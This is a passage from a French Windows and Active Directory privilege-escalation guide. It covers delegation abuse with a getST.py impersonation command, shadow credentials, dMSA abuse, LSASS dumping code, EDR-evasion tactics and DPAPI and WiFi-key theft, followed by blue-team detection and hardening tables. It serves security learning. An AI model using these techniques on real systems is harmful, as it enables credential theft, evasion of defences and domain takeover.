1. Compromet serveur avec unconstrained delegation
2. Force le DC à s y authentifier (PrinterBug / PetitPotam)
3. Capture le TGT du DC
4. Utilise ce TGT pour DCSync → compromission totale domaine

Furtivité ★★☆☆☆ — AV/EDR 🟡 Moyen-élevé — Environnements AD legacy

## Méthode 28 — Constrained Delegation abuse

Compte avec constrained delegation peut impersonifier des utilisateurs vers des services spécifiques. Si tu compromets ce compte, impersonifie n importe qui vers ces services.

S4U2Self + S4U2Proxy :
```bash
getST.py -spn cifs/target.domain.com -impersonate administrator 'domain/svc_account:password'
```

Furtivité ★★★☆☆ — Fréquent

## Méthode 29 — Shadow Credentials

GenericWrite sur un compte AD → ajoute un certificat (msDS-KeyCredentialLink). Authentification par certificat → contexte du compte cible.

Outils : pyWhisker, Whisker.

Furtivité ★★★★☆ — Artefact attribut AD modifié — WS2016+

## Méthode 30 — BadSuccessor (dMSA abuse)

Les Delegated Managed Service Accounts (dMSA) dans Windows Server 2025 permettent de migrer un compte vers un nouveau. Si tu peux créer/modifier un dMSA, lie-le via msDS-ManagedAccountPrecededByLink à n importe quel compte existant. Le KDC construit alors un PAC incluant les SIDs du compte cible.

Impact : escalade vers n importe quel utilisateur, y compris Domain Admin, juste avec GenericWrite sur une OU contenant des dMSA.

Patché CVE-2025-53779 mais primitives subsistent post-patch (Akamai research).

Furtivité ★★★★☆ — Artefact attribut dMSA modifié — WS2025 uniquement

# Partie 8 : Post-exploitation & credentials

## Methode 31 — LSASS Memory Dump

### Theorie

LSASS contient en memoire les credentials des sessions actives (NTLM, Kerberos, mots de passe clair si Wdigest active).

### Techniques d acces

**Technique A — Dump direct (SeDebugPrivilege requis)**

```cpp
HANDLE lsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
MiniDumpWriteDump(lsass, lsass_pid, dump_file, MiniDumpWithFullMemory, ...);
```

**Technique B — Live Kernel Dump (Win11, bypass PPL)**

NtQuerySystemInformation(SystemKernelDebuggerInformation) combine avec DbgkpTriageDumpRestoreState permet de capturer un dump incluant pages user de LSASS sans handle vers le process, contournant ainsi PPL.

**Technique C — BYOVD → modification EPROCESS**

Charge driver vulnerable, modifie champ Protection dans _EPROCESS de LSASS pour retirer PPL, puis dump normalement.

Evaluation :
- Furtivite ★★★☆☆ variable selon technique
- Artefact : dump file
- AV/EDR : eleve si naif (handle LSASS = signature forte), faible avec live kernel dump

---

## Methode 32 — Decorrelation des actions (anti-EDR)

### Theorie

Les EDR detectent les sequences d API suspectes dans un meme process (OpenProcess LSASS + ReadMemory + WriteFile). En separant chaque etape dans un process different avec un outil minimaliste, casse la correlation.

### Comment ca marche

1. Process 1 : exporte les registry keys SAM/SYSTEM/SECURITY (reg save)
2. Process 2 : extrait le boot key (simple requete registre)
3. Transfere les 3 fichiers hors ligne
4. Decrypte localement sur ta machine d attaque

Aucun moment sur la cible n a de comportement suspect.

Evaluation :
- Furtivite ★★★★★
- Artefact : fichiers registres temporaires
- AV/EDR : tres faible
- Compatibilite universelle

---

## Methode 33 — DPAPI Abuse

### Theorie

DPAPI chiffre les secrets utilisateur (mots de passe Chrome, cookies, credentials sauvegardes, WiFi). La cle est liee au mot de passe user ou a la machine. Avec un acces admin, tu peux decrypter ces donnees.

### Cibles courantes

- Cookies et mots de passe navigateurs (Chrome, Edge, Firefox)
- Credentials Manager
- Cles WiFi : netsh wlan show profile name=X key=clear
- EFS certificates

Evaluation :
- Furtivite ★★★☆☆
- Artefact : fichiers extraits
- AV/EDR : faible-moyen
- Compatibilite universelle

# Partie 9 : Detection & Defense (Blue Team)

Montrer que tu comprends comment detecter ce que tu sais faire est un signal portfolio majeur.

## Detection UAC Bypass

Registre :
- Cles a surveiller :
  - \Software\Classes\ms-settings\shell\open\command
  - \Software\Classes\exefile\shell\open\command
  - \Software\Classes\mscfile\shell\open\command
  - \Software\Classes\AppX*\shell\
- Correlation : creation de cle suivie immediatement du lancement d un binaire autoElevate
- Outil : Sysmon Event ID 13 (RegistryEvent)

COM Objects :
- Lancement dllhost.exe avec CLSID specifiques :
  - {3E5FC7F9-9A51-4367-9063-A120244FBEC7} (cmstplua)
  - {D2E7041B-2927-42fb-8E9F-7CE93B6DC937} (colorui)
- Pattern : dllhost.exe /processid:{CLSID} suivi d un process enfant eleve
- Sysmon Event ID 1 (Process Creation)

IFileOperation :
- dllhost.exe effectuant des operations fichiers dans System32
- Sysmon Event ID 11 (FileCreate) + Event ID 7 (ImageLoad)

SilentCleanup :
- Modification variable windir utilisateur
- schtasks /run sur tache DiskCleanup
- Sysmon Event ID 1 + Security Event 4698/4699

## Detection Token Manipulation

Events a surveiller :
- Windows Security 4673 (Sensitive Privilege Use) — SeDebugPrivilege active
- Windows Security 4688 (Process Creation) — process cree avec token vole
- Sysmon Event 10 (ProcessAccess) — handle ouvert vers process sensible

SACL recommandation : Audit ProcessAccess sur winlogon.exe et lsass.exe.
Anomalie cle : handle vers LSASS depuis un process non-SYSTEM.

## Detection Potato Family

- Named pipes inhabituels dans \\.\pipe\
- Connexions RPC anormales vers spoolss / efsrpc
- Sysmon Event ID 17-18 (PipeCreated / PipeConnected)

## Detection AD Attacks

| Attaque | Event / Pattern |
|---|---|
| Kerberoasting | 4769 TGS avec RC4 (0x17) depuis meme user |
| AS-REP Roasting | 4768 pre-auth type 0 |
| DCSync | 4662 Access Mask 0x100 + Properties Replication |
| Delegation abuse | 4769 SPN inattendu, logs S4U2Self/S4U2Proxy |
| BadSuccessor dMSA | Audit creation/modification attributs dMSA |

## Hardening recommandations

| Mesure | Protege contre |
|---|---|
| UAC Always Notify | Tous bypass UAC silencieux |
| LSA Protection (RunAsPPL) | Dumping LSASS |
| Credential Guard | Vol credentials LSASS |
| Disable Unconstrained Delegation | Capture TGT |
| Kerberos AES-only (pas RC4) | Kerberoasting facilite |
| Pre-auth obligatoire tous comptes | AS-REP Roasting |
| Tiered Admin Model | Propagation laterale |
| EDR monitoring COM/Registre | Detection temps reel bypass |
| AppLocker / WDAC | Restriction execution |

---

# Tableau comparatif global

| # | Methode | Categorie | Furtivite | Artefact | AV/EDR | Compat. | Complexite |
|---|---|---|---|---|---|---|---|
| 1 | RUNAS | UAC | ★☆☆☆☆ | Prompt visible | Aucun | 100% | Tres simple |
| 2 | FODHELPER | UAC Reg | ★★☆☆☆ | Cle registre | Moyen | ~95% | Simple |
| 3 | COMPUTERDEFAULTS | UAC Reg | ★★☆☆☆ | Cle registre | Faible-moyen | ~95% | Simple |
| 4 | CMSTPLUA COM | UAC COM | ★★★★☆ | Aucun persistant | Faible | ~90% | Moyenne |
| 5 | SilentCleanup | UAC Env | ★★☆☆☆ | Var env temp. | Faible-moyen | ~85% | Moyenne |
| 6 | WSReset | UAC Reg | ★★★☆☆ | Cle registre | Faible | ~80% | Simple |
| 7 | EventVWR patche | UAC Reg | N/A | Cle registre | Eleve | <=1709 | Simple |
| 8 | SLUI | UAC Reg | ★★★☆☆ | Cle registre | Faible | Bonne | Simple |
| 9 | IFileOperation | UAC COM | ★★★★☆ | DLL System32 | Faible | ~90% | Moy-elevee |
| 10 | Mock Trusted Dir | UAC FS | ★★★☆☆ | Rep factice | Moyen | Variable | Moyenne |
| 11 | PEB Masq + COM | UAC Avance | ★★★★★ | Aucun | Tres faible | ~85% | Elevee |
| 12 | Token Theft winlogon | Token | ★★★★☆ | Aucun disque | Faible-moyen | ~90% | Moyenne |
| 13 | Potato Family | Impersonation | ★★★☆☆ | Pipe temporaire | Moyen | ~85% | Moyenne |
| 14 | SeBackup SAM Dump | Privilege | ★★☆☆☆ | Hives exportes | Eleve naif | Admin requis | Simple |
| 15 | AlwaysInstallElevated | Misconfig | ★★☆☆☆ | MSI installe | Moyen | Rare | Tres simple |
| 16 | Unquoted Path | Misconfig | ★★☆☆☆ | Binaire depose | Faible | Rare | Tres simple |
| 17 | Weak Service Perms | Misconfig | ★★☆☆☆ | Config modifiee | Faible | Frequent | Simple |
| 18 | Task Hijack | Misconfig | ★★☆☆☆ | Script modifie | Faible | Frequent | Simple |
| 19 | Stored Credentials | Creds | ★★★☆☆ | Aucun | Aucun | Frequent | Tres simple |
| 20 | DLL Hijacking | Injection | ★★★☆☆ | DLL deposee | Moyen | Variable | Moyenne |
| 21 | Dot-Local Hijack | Injection | ★★★★☆ | Dossier + DLL | Faible | Bonne | Moyenne |
| 22 | BYOVD | Kernel | ★★★★☆ | Driver charge | Eleve | Depend driver | Tres elevee |
| 23 | Kernel CVE | Kernel | ★★★★★ | Aucun | Quasi nul | Version-specific | Extreme |
| 24 | Kerberoasting | AD | ★★★☆☆ | TGS logue | DC volume | Universel AD | Simple |
| 25 | AS-REP Roasting | AD | ★★★☆☆ | AS-REQ logue | Faible | Universel AD | Simple |
| 26 | DCSync | AD | ★★☆☆☆ | Logs replication | Eleve DC | Universel AD | Simple |
| 27 | Unconstrained Deleg | AD | ★★☆☆☆ | Tickets memoire | Moyen-eleve | AD legacy | Moyenne |
| 28 | Constrained Deleg | AD | ★★★☆☆ | Tickets Kerberos | Faible-moyen | Frequent | Moyenne |
| 29 | Shadow Credentials | AD | ★★★★☆ | Attribut AD modifie | Faible | WS2016+ | Moyenne |
| 30 | BadSuccessor dMSA | AD | ★★★★☆ | Attribut dMSA modifie | Faible | WS2025 | Moyenne |
| 31 | LSASS Dump | Post-expl | ★★★☆☆ | Dump file | Variable | Depends PPL | Variable |
| 32 | Decorrelation anti-EDR | Post-expl | ★★★★★ | Fichiers registres | Tres faible | Universel | Simple |
| 33 | DPAPI Abuse | Post-expl | ★★★☆☆ | Fichiers extraits | Faible-moyen | Universel | Moyenne |

---

# Ressources pour approfondir

Projets open-source de reference :
- UACMe (hfiref0x) — https://github.com/hfiref0x/UACME/
- LOLBAS — https://lolbas-project.github.io/
- HackTricks Windows Privesc — https://hacktricks.wiki/
- ired.team — https://www.ired.team/

Blogs recherche securite :
- SpecterOps (BloodHound)
- itm4n (UAC, PPL, Windows internals)
- Elastic Security Labs
- Google Project Zero
- Akamai Security Research (AD, BadSuccessor)

Outils pratiques :
- Offensif : Mimikatz, Rubeus, SharpUp, PowerUp, Seatbelt, winPEAS, PrintSpoofer/GodPotato
- Defensif : Sysmon, Velociraptor, Elastic/Sentinel detection rules
- Enumeration AD : BloodHound, SharpHound, ldapdomaindump
